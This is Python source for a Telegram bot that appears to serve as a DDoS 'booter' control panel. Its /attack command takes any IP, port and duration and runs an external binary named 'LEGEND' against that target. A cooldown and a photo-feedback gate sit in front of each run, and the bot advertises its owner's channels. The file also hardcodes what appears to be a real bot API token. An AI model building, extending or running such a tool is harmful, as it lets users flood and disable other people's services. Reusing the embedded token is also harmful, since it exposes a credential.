import time
import random
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext, MessageHandler, filters

# Configuration
BOT_API_TOKEN = "5373842002:AAETkiRjk84SNsPHictnLDMhRO2XCFz-N_Q"  # Add your bot API token here
ADMIN_ID = 1232047106  # Replace with your admin Telegram ID
OWNER_NAME = "@OWNERSRK"  # Replace with the owner name

# Cooldown tracker
cooldown_time = 30  # seconds
last_attack_time = 0
awaiting_feedback = False

# Start command
async def start(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        f"🔥 Welcome to the Bot! 🔥\n"
        f"🔗 YouTube: https://www.youtube.com/@zeroflexislive\n"
        f"🔗 Telegram: https://t.me/OWNERSRK\n"
        f"CREATE BY {OWNER_NAME}"
    )

# Help command
async def help_command(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f"Contact the owner for access: @OWNERSRK")

# Add command
async def add(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
    keyboard = [[
        InlineKeyboardButton("✅ Add", callback_data='add'),
        InlineKeyboardButton("❌ Remove", callback_data='remove')
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "You can add or remove access using the buttons below:",
        reply_markup=reply_markup
    )

# Generate command
async def generate(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
    random_number = random.randint(1, 100)
    await update.message.reply_text(f"🎲 Random Number Generated: {random_number}")

# Attack command with binary execution and feedback system
async def attack(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
    global last_attack_time, awaiting_feedback
    current_time = time.time()
    if awaiting_feedback:
        await update.message.reply_text("🛑 Please provide feedback image before starting a new attack!")
        return

    if current_time - last_attack_time < cooldown_time:
        await update.message.reply_text("⏳ Please wait for the cooldown to finish (30 seconds).")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Invalid format! Use: /attack [IP] [Port] [Time]")
        return

    ip = context.args[0]
    port = context.args[1]
    try:
        duration = int(context.args[2])
        if duration > 240:
            await update.message.reply_text("❌ Maximum time is 240 seconds. Please use a lower time.")
            return
    except ValueError:
        await update.message.reply_text("❌ Time must be an integer.")
        return

    last_attack_time = current_time
    attacker = update.effective_user.username if update.effective_user.username else 'Unknown'

    await update.message.reply_text(
        f"🚀 Attack started!\n"
        f"💥 Target: {ip}:{port}\n"
        f"⏱️ Duration: {duration} seconds\n"
        f"👤 By: @{attacker}\n"
        f"📢 CREATE BY {OWNER_NAME}"
    )

    # Execute the binary file with IP, Port, and Duration
    try:
        process = subprocess.Popen(['./LEGEND', ip, port, str(duration)])
        await update.message.reply_text("⚙️ Binary execution started successfully!")
        awaiting_feedback = True
        await update.message.reply_text("📸 Please send an image as feedback to enable the next attack!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error running binary file: {e}")

# Handle image feedback
async def handle_image(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
    global awaiting_feedback
    if awaiting_feedback:
        awaiting_feedback = False
        await update.message.reply_text("✅ Feedback received! You can now start a new attack.")
    else:
        await update.message.reply_text("⚠️ No feedback needed at this time.")

# Main function to set up the bot
async def main() -> None:
    application = ApplicationBuilder().token(BOT_API_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("add", add))
    application.add_handler(CommandHandler("generate", generate))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(MessageHandler(filters.PHOTO, handle_image))

    await application.run_polling()

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())